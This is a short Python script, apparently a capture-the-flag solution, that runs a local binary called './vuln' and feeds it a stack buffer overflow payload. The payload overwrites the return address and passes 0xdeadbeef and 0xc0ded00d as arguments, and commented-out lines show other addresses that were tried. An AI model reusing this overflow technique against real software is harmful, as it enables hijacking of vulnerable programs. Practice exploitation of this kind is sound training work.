import subprocess

p = subprocess.Popen(['./vuln'], stdin=subprocess.PIPE)
print(p.pid)
input()
# RIP = b'\xff\xc0\xe8\x60'[::-1]
RIP = b'\x08\x04\x91\xe2'[::-1]
# PC = b'\x01\x00\x00\x00'
# PC = b'\x08\x04\x92\x58'[::-1]
# PC = b'\x08\x04\x92\x5b'[::-1]
# PC = b'\x08\x04\x92\x5f'[::-1]
p.stdin.write(b'a'*180 + b'b'*8 + RIP + b'c'*4 + b'\xde\xad\xbe\xef'[::-1] + b'\xc0\xde\xd0\x0d'[::-1])
# p.stdin.write(b'a'*180 + b'b'*8)
print(p.communicate())
